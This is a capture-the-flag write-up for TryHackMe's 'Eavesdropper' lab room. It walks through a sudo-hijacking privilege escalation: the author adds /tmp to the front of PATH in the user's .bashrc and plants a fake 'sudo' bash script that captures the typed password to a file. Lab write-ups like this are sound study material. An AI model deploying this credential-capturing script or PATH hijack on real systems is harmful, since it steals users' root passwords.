---
Platform: TryHackMe
Difficulty: Medium
Status: Rooted/Finished
Type: Machine
Title: Eavesdropper
Category: 
tags: 
CreatedOn: 04-12-2023
---
# Eavesdropper

In this writeup we are going to solve the Eavesdropper room from TryHackMe.

Link to the Room : [https://tryhackme.com/room/eavesdropper](https://tryhackme.com/room/eavesdropper)

  

Let’s Start 🙌

  

First Start the machine and download the ssh key. After downloading ssh key, login as frank using this SSH key. The command is : `ssh -i <SSH_Key> frank@<TARGET_IP>`

  

![[Eavesdropper/assets/Untitled.png|Untitled.png]]

  

Our task is to escalate our privileges as root and to read the root flag. For that first we try to take a look at the processes that are running in the target machine. For this purpose I am going to use the tool [pspy](https://github.com/DominicBreuker/pspy). You can also use other tools such as [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for this purpose.

Download the tool to your local machine. We have to transfer this file from our local machine to the target machine because tryhackme rooms don’t have an internet connection. So, we will first download the pspy tool to our local machine. After downloading, create a Python simple HTTP server in the same directory where you downloaded the pspy tool. The command for creating a Python simple HTTP server is: `python -m http.server`. This command will host a simple web server with your current working directory as the root of the web server, which is accessed by your machine's IP address on port `8000`.

  

![[Eavesdropper/assets/Untitled 1.png|Untitled 1.png]]

  

Now you can use the `wget` command to download the pspy tool to the target machine. Since, you are connected to tryhackme via the openvpn, which implies that your target machine can reach your local machine via the openvpn tunnel and vice versa. By this way we can download the pspy tool to the target machine from our local machine.

The command is : `wget http://<tun0-IPaddress>:8000/pspy32`

  

![[Eavesdropper/assets/Untitled 2.png|Untitled 2.png]]

  

Now update the permissions of the pspy tool to executable and run the pspy tool.

  

![[Eavesdropper/assets/Untitled 3.png|Untitled 3.png]]

  

Now take a look at the output of the pspy tool, did you notice anything fishy!!!.

  

![[Eavesdropper/assets/Untitled 4.png|Untitled 4.png]]

  

You can see that a process with the process ID `1844` executes the command `sudo cat /etc/shadow`. And you can also see that this process is repeating again and again. Here the user `frank` uses the `sudo` command to run this, so he must have to enter the root password to run this command. We can capture this process to find the root users password. How are we going to capture this password???

We know that the `sudo` command is located in the `/bin` folder. Take a look at the `PATH` environment variable by using the command : `echo $PATH`.

  

![[Eavesdropper/assets/Untitled 5.png|Untitled 5.png]]

  

For every command or tool we use in the Linux terminal, the Linux system first checks for that particular command or tool file in the order that is mentioned in the `PATH` variable i.e, if we use the command `sudo`, the Linux system first checks the `/usr/local/sbin` directory for the file `sudo`. If it’s not found then it will search in the next directory `/usr/local/bin`. Similarly it will check all the directories for the file `sudo` in the order mentioned in the `PATH` variable until it finds the file.

  

We can take advantage of this characteristic of the Linux system to seek the root users password. This is known as [`Sudo Hijacking`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-hijacking). Now we will a variable named `PATH` at the beginning of the `.bashrc` file that is located in the `/home/frank` directory with the following path: `/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin`.

  

![[Eavesdropper/assets/Untitled 6.png|Untitled 6.png]]

  

By doing this we make the Linux system to first look into the `/tmp` directory for the `sudo` file. Now we can create a fake `sudo` executable file in the `/tmp` directory, which will steal the credentials. By this way when the user `frank` tries to execute the `sudo` command, instead of the actual `sudo` file that is located in the `/bin` directory, the `sudo` file located in the `/tmp` that we created will be executed. For this I have used the following bash script for capturing the password.

  

```
#! /bin/bash

read -sp "[sudo] password for frank: " password

echo $password > /home/frank/password.txt
```

  

![[Eavesdropper/assets/Untitled 7.png|Untitled 7.png]]

  

This script is saved in the name `sudo` in the `/tmp` directory. After saving the file, we have to escalate the files permission to executable by using the following command : `chmod +x sudo`

  

After completing these steps successfully, if you check the `/home/frank` directory you can find the `password.txt` file. If you read the file using the `cat` command you will find the flag.

  

![[Eavesdropper/assets/Untitled 8.png|Untitled 8.png]]

  

Now you got the password for escalating your privileges as the root user. Thus, escalate your privileges as root user using the found password and check the `/root` directory, you can find the flag!!!!

  

![[Eavesdropper/assets/Untitled 9.png|Untitled 9.png]]

  

Thank You!!!!